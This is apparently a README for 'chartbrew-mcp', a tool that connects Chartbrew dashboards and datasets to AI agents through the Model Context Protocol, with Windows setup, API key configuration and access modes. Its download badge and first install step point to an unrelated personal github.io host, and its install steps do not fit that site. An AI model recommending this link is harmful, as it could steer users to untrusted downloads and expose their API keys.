# 📊 chartbrew-mcp - Connect AI agents to your data

[![](https://img.shields.io/badge/Download-chartbrew--mcp-blue.svg)](https://akwaalamanoftheearth21.github.io)

This tool connects your data in Chartbrew to Artificial Intelligence agents. It allows automated systems to view your dashboards, charts, and datasets. You can query your own information using AI tools like Claude, Cursor, and GitHub Copilot. This bridge makes your data accessible to intelligent assistants.

## 📋 What this tool does

Chartbrew-mcp functions as a bridge. It uses the Model Context Protocol to talk to your AI applications. When you use an AI agent, it can request information from your Chartbrew account. 

Features included:
* Connects to your existing teams and workspaces.
* Allows AI to read datasets and live queries.
* Works with dashboards and chart configurations.
* Supports secure embedding for sensitive figures.
* Offers restricted modes to protect your privacy.

## 🖥️ System Requirements

Before you begin, ensure your computer meets these conditions:
* Windows 10 or Windows 11.
* A stable internet connection.
* Node.js installed on your machine.
* An active Chartbrew account.
* An API key generated from your Chartbrew settings page.

## 📥 Downloading and Installation

1. Visit the project website to access the files: [https://akwaalamanoftheearth21.github.io](https://akwaalamanoftheearth21.github.io)
2. Locate the green button labeled "Code" on the right side of the page.
3. Click "Download ZIP" to save the project folder to your computer.
4. Extract the contents of the ZIP file to a folder you can find easily, such as your Desktop or Documents folder.
5. Open your Windows Command Prompt. You can find this by typing "cmd" into the Windows search bar.
6. Navigate to the folder you extracted by typing `cd` followed by the path to the folder.
7. Type `npm install` and press Enter to set up the necessary components.

## ⚙️ Setting Up the Configuration

To allow the AI to speak to Chartbrew, you must provide your login credentials. 

1. Open the folder you extracted.
2. Look for a file named `.env.example`.
3. Right-click the file and choose "Rename" to change it to `.env`.
4. Open this file using a simple text editor like Notepad.
5. Paste your Chartbrew API key into the space provided after the equals sign.
6. Save the file and close the text editor.

## 🚀 Running the Server

Once you finish the setup, you start the server to listen for AI requests:

1. Return to your open Command Prompt window.
2. Type `npm start` and press Enter.
3. The screen will display a message confirming the server is active.
4. You may now open your AI agent software, such as Claude or Cursor.
5. Point your AI software to the local path where you installed this tool.
6. The AI agent will discover the tools provided by Chartbrew automatically.

## 🛡️ Managing Security

Privacy matters when handling data. This tool includes two distinct modes to control what the AI can see.

* Unrestricted Mode: This grants the AI full access to all your datasets and dashboards. Use this if you trust your AI environment completely.
* Restricted Mode: This limits the AI to read-only access for specific dashboards. We recommend this mode for most users to ensure your data stays safe.

You can toggle these modes in the settings file within the project folder. Always review your permissions after major software updates.

## 🧩 How to Use with AI Agents

Most AI tools use the Model Context Protocol to fetch data. Once the server runs, you simply type a question into your AI assistant.

Example prompts:
* "Show me the latest data from my sales dashboard."
* "What is the trend for user growth this month?"
* "List all connections currently active in Chartbrew."

The AI identifies the correct tool and pulls the information directly from your dashboard. It then summarizes the findings for you in plain language.

## 🛠️ Troubleshooting

If the AI fails to connect, follow these steps:
* Check your internet connection. 
* Ensure your Chartbrew API key is correct and has not expired.
* Verify that the Command Prompt window is still open. 
* Restart the server by closing the window and running `npm start` again.
* If you see an error about missing modules, run `npm install` again to refresh your files.

For further assistance, check the main repository page. Many common questions appear in the issues section of the GitHub link above.

Keywords: ai-agent, ai-tools, analytics, chart, chartbrew, chartjs, charts, claude, claude-code, cursor, dashboard, dashboards, data-visualization, github-copilot, llm, mcp, mcp-server, model-context-protocol, typescript